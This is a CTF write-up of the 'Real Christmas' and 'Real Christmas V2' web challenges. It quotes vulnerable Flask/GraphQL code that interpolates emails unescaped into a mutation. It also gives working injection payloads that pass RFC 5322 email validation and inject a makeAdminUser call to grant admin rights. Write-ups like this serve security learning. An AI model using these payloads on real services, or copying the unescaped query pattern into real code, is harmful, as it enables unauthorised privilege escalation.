Real Chirstmas' by cdm22b 
---

This writeup provides a walkthrough of the WEB challenges Real Christmas and Real Christmas V2 made by ` Intrigus, @intrigus. on discord ` for the GPN CTF 25

The two challenges had **37** and **17** solves respectively.

First of all I want to thank Intrigus for such a cool challenge, and the rest of the GPN team for the ctf event.

And also thank my teammate `coutinho21` for the help on the challenge

I will try to make the solve and understanding of the challenge as **simple** as possible

---

## Table of Contents

- [Understanding the challenge](#understanding-the-challenge)
    - [The src code](#the-src-code)
        - [The routes file](#the-routes-file)
        - [The Graphql file](#the-graphql-file)
        - [The Services file](#the-services-file)
- [The solve](#the-solve)
    - [How the RFC sees an email](#how-the-rfc-sees-an-email)
    - [THE V2](#the-v2)

---

# Understanding the challenge

When we open the challenge we can see a simple web page that allows a user to:

- **Register**
- **Login**
- **Get Flag** 

![register-page](https://raw.githubusercontent.com/Coutinho-David/WriteUps/main/GNPCTF25/register.png)

## The src code 

I won't bother you too much with the source code analysis and will show you the _interesting_ things 

### The routes file

The routes file provides a lot of information but I will highlight the most important functions, firstly how to get the flag 

```python
@bp.route("/flag", methods=["GET"])
def get_flag():
    user = get_logged_in_user()
    if not user:
       ... 
    if not user.is_active:
        flash("User account is not active.", "error")
        ...
    if not user.is_admin:
        flash("User account is not an admin, lol.", "error")
        ...

    if current_time - registration_time >= timedelta(seconds=FLAG_WAIT_SECONDS):
        flag = os.environ.get("FLAG")
        ...
       else:
        flash(
            f"Flag will be available after {FLAG_WAIT_SECONDS} seconds from registration",
            "error") 
        ...
    
```


So we get 2 crucial pieces of information: 

- For an account to get the flag it must be **active** and **admin**
- The flag has a certain cooldown to be accessed

<br>

And this is how a user registers in the app :

```python
@bp.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        if not email or not password:
            flash("Email and password are required.", "error")
            return render_template("register.html")

        result = is_email(email, diagnose=True, check_dns=False, allow_gtld=True) # FOCUS ON THIS LINE !!!!
        if isinstance(result, InvalidDiagnosis):
            flash(result, "error")
            return render_template("register.html")

        if User.query.filter_by(email=email).first():
            flash("Email already registered.", "error")
            return render_template("register.html")

        ... 
    
        flash("User registered successfully.", "success")
        return redirect("/login")
    return render_template("register.html")

```

<br> 

1. User provides an email that is validated using python's pyisemail (uses RFC 5322 for email validation)
2. If no user exists with that email, the user successfully registers and is created

---

### The Graphql  file 

```python 

class MakeAdminUser(Mutation):
    class Meta:
        description = "Mutation to make a user an admin"

    class Arguments:
        user = UserInput(required=True)

    success = Boolean()
    message = String()

    def mutate(self, info, user):
        # Auth
        if (
            not info.context.headers.get("Key")
            == current_app.config["SERVICE_TOKEN_KEY"]
        ):
            return MakeAdminUser(success=False, message="Unauthorized")

        # Find the user
        db_user = None
        if user.get("id") is not None:
            db_user = User.query.filter_by(id=user.get("id")).first()
        elif user.get("email") is not None:
            db_user = User.query.filter_by(email=user.get("email")).first()

        if not db_user:
            return MakeAdminUser(success=False, message="User not found")

        db_user.is_admin = True
        db.session.commit()
        return MakeAdminUser(success=True, message="User made admin successfully")

```

<br>

From the code we can see that there exists a mutation to elevate a user to admin, though we are faced with a problem, we cannot just execute it, since the mutation requires a **SECRET_TOKEN_KEY** so we will need to somehow make someone with this key elevate one of our users to admin

--- 

### The Services file 

```python 

def deactivate_user_graphql(email):
    graphql_endpoint = current_app.config["GRAPHQL_ENDPOINT"]
    query = f"""
        mutation {{
            deactivateUser (user: {{email: "{email}"}}){{
                success
            }}
        }}
    """
    try:
        current_app.logger.info(
            f"Sending deactivation request for user: {email} to GraphQL endpoint."
        )
        response = requests.post(
            graphql_endpoint,
            json={"query": query, "variables": {}},
            # Just assume that this deactivation service is running on a separate server,
            # and that we get a token to access it.
            headers={
                "Key": current_app.config["SERVICE_TOKEN_KEY"],
            },
        )

        response.raise_for_status()

    except requests.exceptions.RequestException as e:
        current_app.logger.error(f"Failed to send deactivation request to GraphQL: {e}")
    except Exception as e:
        current_app.logger.error(
            f"An unexpected error occurred during user deactivation: {e}"
        )
        
```

_Voilá_ we just found an injection point, the user's email is being used un-escaped on the graphql mutation. And we can also see that thankfully the operation is being done using that **SECRET_TOKEN** we need to call MakeAdminUser

--- 

## The solve

So if we want to get a flag:

- We need to create a user who's email is validated by the RFC
- We need that user to **NOT** get deactivated
- We need that user to **GET** admin status

<br>

Let's get to building that solution

Firstly the deactivation looks like this : 

```python
mutation {
            deactivateUser (user: {email: " <INPUT> "}){
                success
            }
        }
```

So to make a user NOT be deactivated AND elevated to admin we would need to do

```python
mutation {
            deactivateUser (user: {email: "" }) { success } makeAdminUser( user: { id: 1 } ) {
                success
            }
        }
```

For this, the input injection looks like this : 
```python
" }) { success } makeAdminUser( user: { id: 1 } ) {

```

**Perfect**, we can deactivate no one, and elevate a user with any id to admin

Now this is where we run into the issue, how can we register a user with this email? RFC should block it 

### How the RFC sees an email

The RFC sees an email divided in 2 parts `<local-part>@<domain>`

The Local-part can either be :

- Letters [a-Z]
- Digits [0-9]
- These special chars `!#$%&'*+-/=?^_{|}~`
- It does **NOT** allow `()[]:;@\,<> or space`

So how exactly can we get out of the string (`" <INPUT> "`) and use special chars? 

I (kinda) lied to you, the RFC actually allows almost any ASCII character when wrapped in double quotes, so:

- All of these chars `()<>[]:,;@\"!#$%^&*` and space, are allowed when inside double quotes.

<br> 

So this is enough to build our exploit correct? 

_REMINDER_ : `" }) { success } makeAdminUser( user: { id: 1 } ) { `

<br>

So our local-part will be exactly that 

<br>

`" }) { success } makeAdminUser( user: { id: 1 } ) { "` and our domain `@cdm.com`

BUT this raises an issue, as it creates this errored mutation : 

```python
mutation {
            deactivateUser (user: {email: "" }) { success } makeAdminUser( user: { id: 1 } ) { "@cdm.com
                success
            }
        }

```

To solve this issue we can `#comment` out the junk from our domain, remember the `#` is allowed !

So we get : `"}){success} makeAdminUser(user:{id:1}){  #"@cdm.com`

Which gives us 

```python
mutation {
            deactivateUser (user: {email: "" }) { success } makeAdminUser( user: { id: 1 } ) { #"@cdm.com
                success
            }
        }

```

A correct query !!! 

Shoutout  to `coutinho21` for the help !

Now we just need to create a user with this email 
```python
"}){success} makeAdminUser(user:{id:1}){  #"@cdm.com
```
Making sure id corresponds with this same user's id and login, wait a few seconds for the deactivation task and _voilá_ we get the flag !

![flag1](https://raw.githubusercontent.com/Coutinho-David/WriteUps/main/GNPCTF25/flag1.png)

--- 

# THE V2 

The V2 has one simple code change, you no longer can use **id** on the MakeAdminUser mutation, so you are required to use **email**

This : `makeAdminUser(user: { id: 1 })` does NOT work

This enforces us to use a payload like the previous, with one simple change:

- `"... {email:"someone@somewhere.com"} ... #"@cdm.com`

Giving us:

```python
mutation {
  deactivateUser(user: { email: "" }) {success} makeAdminUser(user {email:"someone@somewhere.com"}) { #"@cdm.com {
    success
  }
}
```

Why is this a huge issue ? We now need to use double quotes inside of double quotes, which the RFC does not enjoy much, `" "" "`

### So how can we pass validation and do an injection? 

Previously I showed you in a simple way how the RFC sees an email, I (kinda) lied to you again ;)

Now we will see how the RFC **really** sees an email

```C
email = local-part "@" ( domain | [ domain-literal ] )
```

According to the RFC : 

A domain can be enclosed in square brackets `[...]` and treated as a **domain-literal**.

<br>

A **domain-literal**:

- Must start with `[`and end with `]`
- **Can** include any printable character except `[ , ] or \`

So what does this mean? This means we have a chance to use 2 double quotes, since inside the domain literal we can use it as much as we like for example, this is valid: 

- `user@[" anything*!? " can be ){ " In _ here ! "]`

So let's go back to our injection, it needs to look like this: 

```python
"}){success} makeAdminUser(user: {email:"someone@somewhere.com"} ){  #"
```

So lets place it inside a domain-literal 

```python
local@[ "}){success} makeAdminUser(user: {email:"someone@somewhere.com"} ){  #" ]
```

What the RFC parser sees ? 

``` python
	local-part : a
	@
	domain-literal : [...]
```


So it is **accepted**, we now just need to create a user with an email that will break the deactivation (so he does not get deactivated), then elevate it to admin by registering another user with our payload

<br>

To break the deactivation we have seen is trivial, just create a user

- `""@cdm.com`

Now he **stays** active, and we simply register another user with our payload  

- ``
local@["}){success} makeAdminUser(user:{email:"\"\"@cdm.com"}) { #"]
``

This makes the server do the following mutation 

```python
mutation {
            deactivateUser (user: {email: "local@["}) {success} 
            makeAdminUser(user:{email:"\"\"@cdm.com"}) {  #"]{
                success
            }
        }
```
 
And we now have a user that is both active and admin, let's get that flag 

![flag2](https://raw.githubusercontent.com/Coutinho-David/WriteUps/main/GNPCTF25/flag2.png)


--- 

Overall this was a great challenge that chains together 2 different vulnerabilities, graphQl injection and RFC bypassing. 

I want to thank Intrigus again for the fun challenge

And thank you for reading this writeup

